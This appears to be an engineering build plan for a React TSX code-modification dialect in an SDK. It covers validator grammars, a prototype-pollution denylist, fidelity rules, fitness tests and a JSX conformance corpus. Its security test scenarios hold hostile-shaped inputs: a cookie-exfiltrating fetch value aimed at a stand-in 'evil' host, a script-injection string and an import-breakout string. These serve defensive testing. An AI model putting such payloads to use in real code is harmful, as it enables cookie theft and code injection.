# Slices: React (TSX/JSX) Dialect (react-dialect)

**Triage**: L (sensitivity override: security code-execution HIGH)
**Spec version**: V4 (react-dialect) + V2 (local-consumption), both signed
**Total slices**: 6 (1 walking skeleton + 5 SPIDR)
**Revision**: 2 — self-contained build brief (plan-verify iter 1: Judge A clean; Judge B demanded embedded substance). Slice structure S-000..S-005, DAG, and coverage are UNCHANGED from rev 1; every contract an executor needs is now embedded.

**Executor context**: the builder MAY read repository source and test files (precedents are named per-task); this artefact is self-contained for CONTRACTS — repo files are referenced for copy-adaptable mechanics only, never for missing requirements.

**Completion contract**: the six slices are all-or-nothing for CHANGE COMPLETION — every REQ is signed spec and verify-final gates on all of them; there is no ship-partial option at archive. Build lands incrementally in DAG order (S-000 first, hard prerequisite), so partial PROGRESS is normal — partial COMPLETION is not.

PM note on count: triage predicted 3-5 non-skeleton slices for a 2-op leaf; this plan lands at 5. Growth is the security floor, not scope creep — the validator ships WITH its first consuming op, SEC scenarios ship WITH their op, and the corpus is a required non-droppable capability. Still under the 7-slice halt threshold.

---

## Shared Contracts (bind every slice)

### Error contract — `dialectError`

All rejects throw via `dialectError(tail)` from `src/core/dialect-error.ts` — mints a fresh `Error` with message `"dialect operation failed: " + tail`, branded into a module-private `WeakSet` (containment discriminator is `isContained(err)`, NEVER a message-prefix match). No `.cause`, no custom class. The caller's tail is the ONLY variable content.

### AST library + mutation API (spike-proven; text-splice FORBIDDEN)

ts-morph@28.0.0 — already the sole runtime dependency (`package.json` pins it exactly; this change adds ZERO deps). `.tsx` parsing = virtual path `dialect-source.tsx` on an in-memory FS, which gives `ScriptKind.Tsx` (the extension drives it; mirror `typescript/ast.ts`'s fresh-`Project`-per-parse shape). Mutations go through the structured API ONLY:

- `setJsxProp`: `JsxOpeningElement`/`JsxSelfClosingElement.addAttribute({ name, initializer })` for insert (`initializer: undefined` → boolean shorthand); `JsxAttribute.setInitializer(text)` / `removeInitializer()` for update. ts-morph writes `name` and `initializer` as RAW TEXT with no escaping — this is WHY the validator is load-bearing (spike leg b: hostile propName splices raw).
- `addImport`: `SourceFile.addImportDeclaration({ moduleSpecifier, namedImports })` to create; `ImportDeclaration.addNamedImport(name)` to merge. The structured path is what escapes `from` (spike leg e: hostile `from` emits ONE escaped string literal); hostile `name` BYPASSING validation splices raw (leg e2) — validator load-bearing here too. A string-concat "optimization" reopens SEC-3+SEC-4 (ADR-05: NON-NEGOTIABLE).

### Handle + coalescing model

`find(path)` returns a thenable chainable `Handle` (`createDialectHandle`, `src/core/dialect-handle.ts`). Ops enqueue against ONE live AST; flush serializes ONCE (memoized `print`) into a SINGLE `modify` directive. A throw inside an op rides `runOp` → `#invokeContained` (brand rethrow) → `#ensureOpen` never reached → ZERO directives emitted + file byte-unchanged; `RunContext.runFailure` poison-flags the chain fail-closed. NO new containment code is written anywhere in this change — tests assert the existing seam. Coalescing tests use the spy-client pattern (`test/support/spy-client.ts` + `defineFactory`; see `test/dialects/typescript/dialect.test.ts`).

### `validatedOp` contract (the single validate-before-mutate chokepoint)

```ts
// src/core/jsx-name-validator.ts (kit-internal, NO barrel export — dialect-error/deep-equal precedent)
export function validatedOp<Ast, A extends unknown[]>(
  validators: (args: A) => void,          // runs the assertValid* set for this op's declared args
  body: (ast: Ast, ...args: A) => void    // mutation code lives INSIDE body
): (ast: Ast, ...args: A) => void;
```

`validators` runs first and throws `dialectError` (via reject-tail helpers) on any failure — `body` is structurally unreachable before every declared arg validates. Zero-emit-on-reject is NOT implemented here; it falls out of the existing handle machinery above.

### Name grammars + denylist (verbatim — these ARE the contract)

- `addImport.name` — `^[A-Za-z_$][A-Za-z0-9_$]*$` (plain JS identifier; no alias handling, neither op takes an `as`).
- `setJsxProp.propName` — `^[A-Za-z_][A-Za-z0-9_-]*(:[A-Za-z_][A-Za-z0-9_-]*)?$` (hyphens + ONE colon segment: admits `data-testid`, `aria-label`, `xlink:href`; neither `-` nor `:` can terminate the attribute-name token). This is the SPLICED, validator-protected channel.
- `setJsxProp.elementName` — member/namespaced/hyphenated JSX-name grammar accepting `Button`, `Menu.Item`, `my-web-component` (identifier segments joined by `.`, or a hyphenated name). LOOKUP-ONLY: compared against each element's tag-name text, NEVER spliced — its validation is input-hygiene UX, not an injection gate.
- **Denylist** (applies to BOTH `propName` and `elementName`; `addImport.name` hits it where the grammar admits): frozen `ReadonlySet<string> = new Set(["__proto__", "constructor", "prototype"])`, checked via `.has()` equality — NEVER an object literal (its inherited keys are exactly the attack), never regex-encoded.
- **Set-key-safety clause**: `propName`/`elementName` are NEVER plain-object keys anywhere in validator/targeting code — no `record[name]`, no `{[name]: …}`, no `counts[tag]++`; Set/Map/`===` only. This, not denylist width, is the real Stage-4b `__proto__` defence. S-001.4's static scan asserts it over `src/core/jsx-name-validator.ts` + `src/dialects/react/**`.

Exports: `JSX_NAME_DENYLIST`, `assertValidAttributeName(propName)`, `assertValidElementName(elementName)`, `assertValidImportBinding(name)`, `validatedOp`.

### reject-tail semantics + tail catalog

`src/core/reject-tail.ts` (kit-internal, no barrel): `nameRuleTail(argName, ruleLabel)` builds "`{argName}` must … ({ruleLabel})" + the two-remedy pair (fix the name / use `.modify()`); `boundedFragment(s, cap = 16)` is a hard 16-char ceiling for the RARE diagnostic fragment. DEFAULT = ZERO echo of rejected values: the hostile input never appears on the error surface (message, stack, own props) — `surfaceContains` in the canary test is the checker. Argument NAMES may appear; VALUES never do. The TS dialect's `assertNoCollision` full-`"${name}"`-echo pattern must be structurally unreachable from react paths (the wrapper + tail helper enforce it by construction).

Tail catalog (every tail is passed to `dialectError(tail)`; gate tails MAY echo the offending path, bounded — paths are not payloads):

| Reject class | Tail content (binding substance; exact wording executor's, content pinned) |
|---|---|
| gate `.ts` | names `@pbuilder/sdk/typescript` as the fix |
| gate `.jsx` | states v1 does not support `.jsx` + names the React op-catalog follow-up as where it's tracked |
| gate other suffix (incl. dotfile `.babelrc`, trailing-dot `Button.`) | states `.tsx` is the only supported extension |
| gate extensionless basename | e.g. `find(path) — the React dialect requires an explicit .tsx extension; received a path with no extension. Append .tsx to the path.` (spec's own example) |
| validator grammar reject | `nameRuleTail(argName, grammar-rule-label)` + remedy pair; NO value echo |
| validator denylist reject | names the reserved-name rule; MAY echo the fixed denylist literal (`__proto__` etc. — it IS the rule's vocabulary, ≤16 chars) |
| `setJsxProp` zero matches | names the missing element + suggests `.modify()` |
| `setJsxProp` >1 matches | names the element AND the match count + points at `.modify()` for disambiguation |

### Golden convention

Goldens live at `test/dialects/react/golden/*.txt` (mirrors `test/dialects/typescript/golden/`), committed byte-exact, asserted `expect(printed).toEqual(golden)` — authored FAILING-FIRST (Strict TDD: write the test + golden expectation, watch it fail, then implement).

---

## S-000: Walking Skeleton — leaf, subpath, extension gate, fidelity, harness wiring

**Scope**: walking-skeleton · **Dimension**: — · **Requires**: nothing · **Droppable**: No — foundation.
**Covers**: REQ-RXD-02 (.1–.5, .8–.10), REQ-RXD-03 (.1–.5), REQ-RXD-14 (.1), REQ-RXD-01.1 (subpath-resolves half only — exact-set closes in S-002)
**Test layers**: unit + fitness (architectural)

### Contracts

**`react/ast.ts` — duplicate (NOT hoist) the four fidelity primitives** (ADR-01; copy-adapt from `src/dialects/typescript/ast.ts`, which stays UNTOUCHED):

1. **BOM re-prepend**: ts-morph@28's `getFullText()` strips a leading UTF-8 BOM (verified). Module-private `WeakMap<SourceFile, boolean>` (`hadBom`) set at parse when source starts with the BOM char; `print` re-prepends it.
2. **Content-derived newline**: `detectNewLineKind(source)` — count `"\r\n"` pairs vs bare `"\n"`; CRLF wins strictly on `crlf > bareLf`, tie (incl. empty) → LF. NEVER host-OS-derived.
3. **Frozen ManipulationSettings**: fresh `new Project({ useInMemoryFileSystem: true, manipulationSettings: { indentationText: TwoSpaces, quoteKind: Double, newLineKind: detectNewLineKind(body), usePrefixAndSuffixTextForRename: false } })` PER parse — never a module singleton. Virtual path: `dialect-source.tsx` (the `.tsx` extension engages `ScriptKind.Tsx`).
4. **Syntactic-diagnostic throw**: after `createSourceFile`, `getProgram().getSyntacticDiagnostics(sourceFile).length > 0` → `throw new Error(...)` (plain Error — the handle wraps it with the contained prefix). Semantic/type diagnostics do NOT throw.

Signatures: `parse(source: string): SourceFile` / `print(ast: SourceFile): string`.

**`react/index.ts` — `find()` + synchronous basename gate**: compose via the sanctioned kit surface exactly as `src/dialects/typescript/index.ts` does — `defineOpPack<SourceFile, ReactOps>({...})`, `defineDialect({ extensions: [".tsx"], ast: { parse, print }, ops: {} })`, `withOps(base, pack)`, export `find(path): Handle<"found", SourceFile, ReactOps>`. In this slice the op-pack is EMPTY (ops arrive S-001/S-002). The gate classifies `basename(path)` BEFORE delegating, throwing `dialectError` synchronously (the bare `find()` call throws — no op chained, no flush):

1. suffix `.tsx` → pass to the handle factory;
2. basename contains NO dot (directory dots don't count: `src/v1.2/Button` is extensionless) → extensionless reject (tail catalog);
3. basename has a dot, suffix ≠ `.tsx` → per-suffix reject (`.ts` / `.jsx` / other — tail catalog). Dotfile `.babelrc` (suffix `babelrc`) and trailing-dot `Button.` (empty suffix) resolve through THIS rule, not the extensionless one.

`find`'s JSDoc: tsx-only + sync gate + extensionless reject + `.jsx` forward-compat rationale + one `value`-trust line + `@example` + note that gate rejects carry the standard `dialect operation failed: ` prefix (this JSDoc is FIT-04-pinned via the new `.d.ts` baseline).

**Exports map** (`package.json#exports`, currently 5 subpaths + bin `pbuilder-codegen`): `.`, `./commons`, `./conformance`, `./testing`, `./typescript`. ADD:

```json
"./react": { "types": "./dist/dialects/react/index.d.ts", "import": "./dist/dialects/react/index.js" }
```

`src/core` deliberately has NO subpath (stays unresolvable — S-005 asserts it).

**Fitness mechanics** (all failing-first where new):

- FIT-04 (`test/fitness/fit-04-dts-semver-gate.test.ts`): committed-`.d.ts`-baseline diff. Add pair `test/fitness/dts-baseline/react.index.d.ts` to `DTS_PAIRS`; generate the baseline once the surface is intentional (pins `find`'s JSDoc incl. trust line).
- FIT-09 (`test/fitness/fit-09-pkg-exports-resolution.test.ts`): exact exports-list assertion 5→6 + a `./react` resolution case.
- FIT-14 (`test/fitness/fit-14-package-surface.test.ts` + `test/fitness/pkg-surface-baseline.json`): two exact-5→6 assertions + baseline regen (exports + `dist/dialects/react/**` tarball entries).
- NEW `fit-36-spike-deps-absent.test.ts` (REQ-RXD-14): scan `package.json` (ALL fields) + committed lockfile for `@babel/parser`, `@babel/generator`, `recast`, `magic-string` → zero matches; assert `dependencies` deep-equals exactly `{ "ts-morph": "28.0.0" }`.
- NEW `fit-37-core-commons-ast-free.test.ts`: scan `src/core/**` + `src/commons/**` imports → zero AST libraries (guards ADR-01's boundary).
- NEW `fit-38-parser-construction-confinement.test.ts`: `new Project(` appears ONLY in `src/dialects/*/ast.ts`, scanned repo-wide over `src/**` (retro-covers `typescript/ast.ts`).
- FIT-01/FIT-02 auto-cover the new leaf — zero edits.

### Acceptance (verbatim signed-spec scenarios)

REQ-RXD-02.1 — GIVEN a path ending in `.ts` WHEN `find(path)` is called THEN it throws a `dialectError` whose message names `@pbuilder/sdk/typescript` as the fix.
REQ-RXD-02.2 — GIVEN a path ending in `.jsx` WHEN `find(path)` THEN it throws a `dialectError` stating `.jsx` is unsupported in v1 and naming the React op-catalog follow-up as where it is tracked.
REQ-RXD-02.3 — GIVEN a path ending in an extension that is neither `.tsx`/`.ts`/`.jsx` (e.g. `.md`) WHEN `find(path)` THEN it throws a `dialectError` stating `.tsx` is the only supported extension.
REQ-RXD-02.4 — GIVEN a path ending in `.tsx` WHEN `find(path)` is called and an op runs THEN no extension-gate rejection occurs — the handle proceeds to parse.
REQ-RXD-02.5 — GIVEN a path ending in `.ts` WHEN `find(path)` is invoked bare, NO op chained, NO run flush THEN the `find()` call itself throws synchronously (`expect(() => find("a.ts")).toThrow`) — a gate deferred to first-op resolution or flush FAILS this.
REQ-RXD-02.8 — GIVEN `find(".babelrc")` and `find("Button.")` WHEN each is called THEN each throws a `dialectError` synchronously with the existing "only `.tsx`" reject tail — both basenames CONTAIN a dot, so both resolve through the non-`.tsx`-suffix rule, not the extensionless rule.
REQ-RXD-02.9 — GIVEN `find("src/Button")` (basename with no `.`) WHEN `find()` is called THEN it throws a `dialectError` synchronously whose tail states the React dialect requires an explicit `.tsx` extension and tells the author to append `.tsx` — no normalization, no deferred rejection.
REQ-RXD-02.10 — GIVEN `find("src/v1.2/Button")` (dotted DIRECTORY segment, extensionless basename) WHEN `find()` is called THEN it throws the SAME explicit-`.tsx`-requirement `dialectError` as 02.9 — the `v1.2` dot does not count as an extension.
REQ-RXD-03.1 — GIVEN a `.tsx` sample containing fragments, self-closing tags, and expression containers WHEN parsed and printed with no edit THEN the output is byte-exact against the original.
REQ-RXD-03.2 — GIVEN a seeded `.tsx` file with a UTF-8 BOM and JSX content WHEN round-tripped with no edit THEN the BOM is preserved byte-exact.
REQ-RXD-03.3 — GIVEN a seeded `.tsx` file with CRLF line endings and JSX content WHEN round-tripped with no edit THEN CRLF line endings are preserved byte-exact.
REQ-RXD-03.4 — GIVEN the sample `const id = <T,>(a: T) => a;` WHEN parsed and printed with no edit THEN it round-trips byte-exact — the parse succeeds under TSX semantics.
REQ-RXD-03.5 — GIVEN the sample `const x = <string>y;` (legal cast under `.ts`, unclosed JSX element under `ScriptKind.Tsx`) WHEN `parse` runs THEN it FAILS as a parse rejection (contained per REQ-DG-05.2's contract) — the SAME source parses cleanly through the TypeScript dialect's `parse`; that divergence is the proof `ScriptKind.Tsx` is live. (Spike-confirmed: 2 syntactic diagnostics under Tsx, 0 under `.ts`.)
REQ-RXD-14.1 — GIVEN the shipped `package.json` and committed lockfile after this change WHEN scanned for `@babel/parser`, `@babel/generator`, `recast`, `magic-string` THEN zero matches — and `dependencies` still equals exactly the single exact-pinned `ts-morph` entry.
REQ-RXD-01.1 (resolves-half) — GIVEN `package.json#exports` WHEN `@pbuilder/sdk/react` is imported THEN it resolves. (The exact-op-set half closes in S-002 when both ops exist.)

### Tasks
- [ ] S-000.1 `src/dialects/react/ast.ts` — four duplicated primitives per Contracts; virtual `dialect-source.tsx`
- [ ] S-000.2 `src/dialects/react/index.ts` — `find()` basename gate (all 4 reject classes + pass) + composition with `ops: {}`; `find` JSDoc per Contracts
- [ ] S-000.3 `package.json#exports` `./react` entry; FIT-09 5→6 + `./react` case; FIT-14 assertions + baseline regen; FIT-04 `DTS_PAIRS` + `react.index.d.ts` baseline
- [ ] S-000.4 NEW `fit-37` + `fit-38` per Fitness mechanics
- [ ] S-000.5 NEW `fit-36` per Fitness mechanics
- [ ] S-000.6 `test/dialects/react/dialect.test.ts` — all Acceptance scenarios above, failing-first

---

## S-001: `setJsxProp` — targeting, upsert, placement, value forms, validation

**Scope**: happy-path · **Dimension**: R (Rule — match-count trio governs mutate-vs-reject) · **Requires**: S-000 · **Droppable**: No — the security-anchor op; validator load-bearing per spike leg (b).
**Covers**: REQ-RXD-04 (.1–.6), REQ-RXD-10 (.1–.6), REQ-RXD-11 (.1–.5), REQ-RXD-12 (.1), REQ-RXD-06 (elementName/propName portion: .1, .2, .5, .6), REQ-RXD-13 (.1–.3, setJsxProp reject paths)
**Test layers**: unit + unit(sec) + goldens

### Contracts

**Op signature**: `setJsxProp(ast: SourceFile, elementName: string, propName: string, value?: string): void`, exported from `src/dialects/react/ops.ts`, wrapped in `validatedOp` (validators: `assertValidElementName(elementName)` + `assertValidAttributeName(propName)`; `value` is NOT validated — trust contract).

**Targeting (inside body, after validation)**: count elements whose opening/self-closing tag-name text equals `elementName` — text-equality against `getTagNameNode().getText()` (member-expression names like `Menu.Item` ARE in-scope targeting: the grammar accepts them and equality matches the full member text). 0 matches → reject (tail catalog); exactly 1 → mutate; N>1 → reject naming element + count. Never silent-first-match.

**Upsert**: `getAttribute(propName)` hit → `setInitializer(value)`; hit + `value` omitted → `removeInitializer()` (→ boolean shorthand); miss → `addAttribute({ name: propName, initializer: value })` (omitted value → `initializer: undefined`).

**Value forms (REQ-RXD-11 — verbatim initializer TEXT, author supplies delimiters)**: `'"hi"'` → `bar="hi"` (string form); `'{count}'` → `bar={count}` (expression container); omitted/`undefined` → boolean shorthand `bar` (no `=`); malformed value (e.g. `'{'`) emitted AS-IS — no output re-validation, author owns well-formedness (REQ-RXD-12).

**Placement (REQ-RXD-10)**: inserted attribute appended AFTER the last existing attribute — including after a trailing `{...spread}` (deliberate: explicit prop lands after the spread and WINS at React runtime, later-position precedence) — single-space separator, NO reflow of element or file. ts-morph appends onto the LAST attribute's line even for multi-line elements — spec-consistent (10.1's universal single-space contract), captured verbatim in the committed multi-line golden. Update replaces the initializer IN PLACE (attribute position preserved). Self-closing stays self-closing; paired stays paired.

**Trust boundary (REQ-RXD-12, embed in JSDoc)**: `value` is emitted verbatim and becomes executable code; the SDK performs no validation/escaping/sanitisation on it; the author is solely responsible for untrusted input. `elementName`/`propName` are validated and NOT a trusted-code channel. (Note: `setJsxProp`'s JSDoc does not reach the public `.d.ts` — the `OpMethods` mapped type strips op JSDoc; the PINNED controls are `find`'s trust line (FIT-04) + the S-004 doc-guard sections.)

### Acceptance (verbatim signed-spec scenarios)

REQ-RXD-04.1 — GIVEN a `.tsx` file with exactly ONE `<Button />` and no `onClick` WHEN `setJsxProp("Button", "onClick", "{handleClick}")` THEN output shows `onClick` inserted; every other region byte-identical.
REQ-RXD-04.2 — GIVEN `<Button onClick={oldHandler} />` WHEN `setJsxProp("Button", "onClick", "{newHandler}")` THEN the value is replaced with `{newHandler}`, no duplicate `onClick`.
REQ-RXD-04.3 — GIVEN a multi-element `.tsx` sample, `setJsxProp` applied to the ONE match WHEN diffed against the original THEN only the targeted attribute's region differs.
REQ-RXD-04.4 — GIVEN no element named `Missing` WHEN `setJsxProp("Missing", "x", "{1}")` THEN reject via `dialectError` naming `Missing` as not found + suggesting `.modify()`, zero directives, file byte-unchanged.
REQ-RXD-04.5 — GIVEN TWO `<Button />` elements WHEN `setJsxProp("Button", "onClick", "{f}")` THEN reject naming `Button` AND the count (2), pointing at `.modify()` — never silent first-match; zero directives, byte-unchanged.
REQ-RXD-04.6 — GIVEN exactly one `<Menu.Item />` WHEN `setJsxProp("Menu.Item", "disabled")` THEN the attribute is inserted (boolean shorthand), byte-exact vs committed golden.
REQ-RXD-10.1 — GIVEN `<Button type="submit" className={cls} />` (one match) WHEN `setJsxProp("Button", "disabled", "{isBusy}")` THEN the new attribute appears immediately after `className={cls}` with a single-space separator, byte-exact golden — no reordering, no reflow.
REQ-RXD-10.2 — GIVEN `<Button {...rest} />` (one match) WHEN `setJsxProp("Button", "onClick", "{safe}")` THEN output is `<Button {...rest} onClick={safe} />` byte-exact — explicit prop AFTER the spread, wins at React runtime.
REQ-RXD-10.3 — GIVEN `<Button onClick={old} type="submit" />` WHEN `setJsxProp("Button", "onClick", "{fresh}")` THEN `onClick` stays FIRST with initializer replaced — position preserved, byte-exact golden.
REQ-RXD-10.4 — GIVEN self-closing `<Input />` (one match) WHEN `setJsxProp("Input", "required")` THEN the element remains self-closing.
REQ-RXD-10.5 — GIVEN paired `<Button>Save</Button>` (one match) WHEN `setJsxProp("Button", "disabled")` THEN the element remains paired, children byte-identical.
REQ-RXD-10.6 — GIVEN an element whose attributes span multiple lines WHEN `setJsxProp` inserts THEN byte-exact vs committed golden — existing line structure undisturbed.
REQ-RXD-11.1 — GIVEN `setJsxProp("Input", "placeholder", '"Search…"')` WHEN flushed THEN the printed attribute is `placeholder="Search…"`, byte-exact golden.
REQ-RXD-11.2 — GIVEN `setJsxProp("Input", "value", "{count}")` WHEN flushed THEN `value={count}`, byte-exact golden.
REQ-RXD-11.3 — GIVEN `setJsxProp("Input", "required")` (no third arg) WHEN flushed THEN bare `required` — no `=`, no initializer.
REQ-RXD-11.4 — GIVEN `<Input value="static" />` and `setJsxProp("Input", "value", "{dynamic}")` WHEN flushed THEN `value={dynamic}` — form replaced in place, byte-exact golden.
REQ-RXD-11.5 — GIVEN `setJsxProp("Button", "data-x", "{")` WHEN flushed THEN the `{` is emitted verbatim — no output re-validation (REQ-RXD-12).
REQ-RXD-12.1 — GIVEN `setJsxProp("Button", "onError", '{fetch("//evil/"+cookie)}')` (injection-shaped payload in VALUE position) WHEN flushed THEN it SUCCEEDS and the payload appears VERBATIM as `onError`'s initializer (rejection twin: 06.1, same payload as propName).
REQ-RXD-06.1 — GIVEN `setJsxProp("Button", 'onError={fetch("//evil/"+cookie)}', "{x}")` (payload in PROPNAME position) WHEN applied THEN reject via `dialectError` BEFORE any AST mutation — zero directives, file byte-unchanged.
REQ-RXD-06.2 — GIVEN propNames `data-testid`, `aria-label`, `xlink:href` (each on its own single-match element) WHEN flushed THEN all three succeed byte-exact vs committed golden.
REQ-RXD-06.5 (setJsxProp portion) — GIVEN each of `__proto__`, `constructor`, `prototype`, `"Foo bar"`, `"Foo=1}"`, `"a><script>alert(1)</script>"`, `""`, `"   "`, `"foo\nbar"`, `"123abc"` as `elementName` and as `propName` WHEN applied THEN every case rejects pre-mutation — zero directives, byte-unchanged; the three denylist names reject via frozen-`Set` equality despite matching the grammar; each such tail names the reserved-name rule (fixed literal MAY be echoed, ≤16 chars).
REQ-RXD-06.6 — GIVEN `setJsxProp("Menu.Item", "x", "{1}")` and `setJsxProp("my-web-component", "x", "{1}")` each with exactly one match WHEN applied THEN neither is rejected by the validator — both proceed to targeting.
REQ-RXD-13.1 — GIVEN a name-validator reject triggered with a hostile value containing a unique canary string (≥24 chars, so no ≤16-char fragment can contain it) WHEN the error is swept via `surfaceContains` (message, own props, `.cause`, stack) THEN the canary appears NOWHERE.
REQ-RXD-13.2 (setJsxProp paths) — GIVEN one representative reject from validator + zero-match + multi-match WHEN each run settles THEN each emits ZERO directives and a subsequent read shows the file byte-unchanged. (addImport + in-run gate paths close in S-002.)
REQ-RXD-13.3 — GIVEN a propName validator reject with a 100-char hostile value WHEN the message is inspected THEN it names `propName` and the grammar rule; the full value does NOT appear (any fragment ≤16 chars).

### Tasks
- [ ] S-001.1 `src/core/jsx-name-validator.ts` — three grammars + frozen denylist + `validatedOp` per Shared Contracts (first consumer)
- [ ] S-001.2 `src/core/reject-tail.ts` — `nameRuleTail`/`boundedFragment` per Shared Contracts
- [ ] S-001.3 `src/dialects/react/ops.ts` — `setJsxProp` per Contracts; wire into the op-pack in `index.ts`
- [ ] S-001.4 `test/dialects/react/ops.test.ts` (value forms + upsert goldens) + `test/dialects/react/name-validation.test.ts` (hostile battery, denylist, load-bearing raw-splice pin, zero-emit/byte-unchanged, Set-key-safety static scan) + placement goldens in `dialect.test.ts`
- [ ] S-001.5 `test/security/canary-no-echo.test.ts` — add react case: canary as hostile propName through `setJsxProp`, swept via the existing `surfaceContains`

---

## S-002: `addImport` — merge/create/idempotent, coalescing, exact op-set closes

**Scope**: happy-path · **Dimension**: P (Path — merge vs create vs no-op flows) · **Requires**: S-001 (shares `validatedOp`/validator; coalescing needs both ops) · **Droppable**: No — completes the author journey; coalescing is the strongest one-live-AST proof.
**Covers**: REQ-RXD-05 (.1–.4), REQ-RXD-06 (addImport portion: .3, .4), REQ-RXD-07 (.1), REQ-RXD-13 (addImport + in-run gate paths of .2), REQ-RXD-01 (.1 full — exact set now assertable)
**Test layers**: unit + unit(sec) + goldens + integration (spy-client)

### Contracts

**Op signature**: `addImport(ast: SourceFile, name: string, from: string): void`, `validatedOp`-wrapped on `name` (`assertValidImportBinding`); `from` has NO allow-list (legitimate specifiers contain `@ / . :`) — its safety is ts-morph's string-literal escaping, PINNED by 06.4, never assumed. Written FRESH (not copied from the TS op, which validates nothing — retrofit is pending item 22).

**Behavior**: existing named-import clause from the SAME `from` → `addNamedImport(name)` merge; none → `addImportDeclaration({ moduleSpecifier: from, namedImports: [name] })`. Idempotent: same `name`+`from` twice on one handle → single import line. NAMED-ONLY, pinned: always `import { name } from "from"` — never default/namespace synthesis (catalog follow-up scope).

**Exact-op-set mechanism** (mirrors `test/dialects/typescript/ops-exact-set.test.ts`): inside a `defineFactory` run with `makeSpyClient`, `Object.keys(handle).filter(k => !RESERVED_HANDLE_NAMES.has(k)).sort()` — `RESERVED_HANDLE_NAMES` from `src/core/define-dialect.ts` — then `expect(opKeys).toEqual(["addImport", "setJsxProp"])`. `toEqual`, never `toContain`: an extra op fails RED.

### Acceptance (verbatim signed-spec scenarios)

REQ-RXD-05.1 — GIVEN a `.tsx` file with no import from the target module WHEN `addImport("useState", "react")` THEN output contains `import { useState } from "react";` inserted, byte-exact vs committed golden.
REQ-RXD-05.2 — GIVEN an existing `import { useEffect } from "react";` WHEN `addImport("useState", "react")` THEN a single clause names both `useEffect` and `useState`.
REQ-RXD-05.3 — GIVEN `find(path).addImport(x, m).addImport(x, m)` WHEN flushed THEN a SINGLE valid import statement for `{x} from m` — no duplicates.
REQ-RXD-05.4 — GIVEN `addImport("React", "react")` WHEN flushed THEN the NAMED form `import { React } from "react";` — NOT `import React from "react"` — v1 never synthesizes default/mixed imports.
REQ-RXD-06.3 — GIVEN `addImport('x } from "evil"; import { y', "react")` WHEN applied THEN reject via `dialectError`; ZERO new import statements; file byte-unchanged.
REQ-RXD-06.4 — GIVEN `addImport("X", 'a"; import {y} from "evil')` WHEN flushed THEN exactly ONE import declaration whose module specifier is the full hostile string ESCAPED as a single string literal — no `"evil"` import (pins the ts-morph escaping assumption; spike leg e confirmed).
REQ-RXD-06.5 (addImport portion) — the hostile battery of S-001, where the grammar applies, as `addImport.name` — every case rejects pre-mutation, zero directives, byte-unchanged.
REQ-RXD-07.1 — GIVEN `find(path).setJsxProp("Button", "onClick", "{handleClick}").addImport("handleClick", "./handlers")` WHEN flushed THEN exactly ONE `modify` directive whose content shows BOTH the imported symbol AND the JSX attribute wired in, byte-exact vs committed golden (spy-client asserts directive count).
REQ-RXD-13.2 (remaining paths) — GIVEN one representative reject from the addImport validator AND the extension gate in its in-run form WHEN each settles THEN zero directives, file byte-unchanged — completing 13.2's four-path matrix with S-001's.
REQ-RXD-01.1 (full) — GIVEN `package.json#exports` WHEN `@pbuilder/sdk/react` is imported and the op-pack surface is enumerated (mechanism above) THEN it resolves AND the sorted keys EQUAL EXACTLY `["addImport", "setJsxProp"]`.

### Tasks
- [ ] S-002.1 `src/dialects/react/ops.ts` — `addImport` per Contracts; wire into the op-pack (both ops now composed)
- [ ] S-002.2 `test/dialects/react/ops.test.ts` (merge/create/idempotent/named-only goldens) + `name-validation.test.ts` addImport portion (SEC-3 breakout reject, SEC-4 escape pin)
- [ ] S-002.3 coalescing scenario in `dialect.test.ts` — heterogeneous regions, one directive, golden (spy-client pattern)
- [ ] S-002.4 `test/dialects/react/ops-exact-set.test.ts` — exact 2-op `toEqual` per mechanism above

---

## S-003: Conformance — 20-sample JSX adversarial corpus

**Scope**: happy-path · **Dimension**: D (Data — corpus variety of input classes) · **Requires**: S-002 (`testOpPack` mutation legs need both ops) · **Droppable**: No (explicit) — REQ-RXD-08 is a required capability; the kit's 6 mandatory samples are JSX-blind and prove nothing about this dialect's syntax surface.
**Test layers**: integration

### Contracts

**Kit wiring**: `testDialect({ dialect, samples })` / `testOpPack(...)` from `src/conformance/` (public at `@pbuilder/sdk/conformance`; both async, return `Promise<void>`). Wiring precedent: `test/conformance/typescript-conformance.test.ts`. The 6 kit-mandatory samples (empty file, comment-only, 4 MiB comment, CRLF, BOM, duplicate-import) are built into the kit — the react fixture ADDS the JSX corpus. `testOpPack` requires ≥1 multi-op exercise — the `addImport`+`setJsxProp` chain satisfies it.

**The 20 corpus samples** (each a `.tsx` source; round-trip byte-exact via `testDialect` unless noted):

1. Fragments — `<>...</>` with nested children.
2. Self-closing tags — `<Input />`.
3. Expression containers — `{count}`, `{items.map(...)}`.
4. Spread props — `<Button {...rest} />`.
5. Namespaced attribute — `<use xlink:href="#id" />`.
6. HTML entities — `&nbsp;`, `&amp;` in JSX text.
7. Comments-inside-JSX — explicit `{/* x */}` sample.
8. Logical-AND conditional — `{cond && <X/>}`.
9. Ternary rendering — `{cond ? <A/> : <B/>}`.
10. Parenthesised JSX return — `return (\n  <div/>\n)`.
11. Template-literal JSX-lookalike — a template literal containing `<div>${x}</div>` (must NOT be JSX-ified).
12. String-child JSX-lookalike — `<p>{"<script>"}</p>`.
13. Whitespace fidelity — `<br />` AND `<br/>` in one sample; the pre-`/>` space survives.
14. TSX generic arrow — `const id = <T,>(a: T) => a;`.
15. `<Menu.Item/>` member-expression element.
16. Multi-line-attribute element (attributes across lines).
17. CRLF + JSX.
18. BOM + JSX.
19. 4 MiB TSX sample (spike-measured ~200 ms round-trip — acceptable).
20. Angle-bracket-cast divergence probe — `const x = <string>y;` exercised as a parse-REJECT sample (contained failure), not a round-trip.

**Mutation legs (REQ-RXD-08.2)**: exercise `setJsxProp` chains via `testOpPack` across the corpus, INCLUDING `<Menu.Item/>` (member-name targeting — parse fidelity AND mutation) and the multi-line-attribute element as INSERTION targets; each coalesced `modify` content byte-exact vs its fixture `expect` value.

**Goldens** authored per-sample at build time, failing-first, per the Golden convention (Shared Contracts).

### Acceptance (verbatim signed-spec scenarios)

REQ-RXD-08.1 — GIVEN the JSX adversarial corpus (every class above) plus the 6 kit-mandatory samples WHEN run through `testDialect` against the React dialect THEN every sample round-trips byte-exact.
REQ-RXD-08.2 — GIVEN the corpus exercised via `testOpPack` with `setJsxProp` chains, including `<Menu.Item/>` and the multi-line-attribute element as INSERTION targets WHEN run THEN each exercise's coalesced `modify` content is byte-exact against its fixture — fidelity under REAL mutation, not idle round-trip.

### Tasks
- [ ] S-003.1 `test/conformance/react-conformance.test.ts` — 20 samples per enumeration above, authored failing-first
- [ ] S-003.2 wire `testDialect` (round-trip legs incl. divergence-probe reject) + `testOpPack` (mutation legs + heterogeneous chain) against the react dialect

---

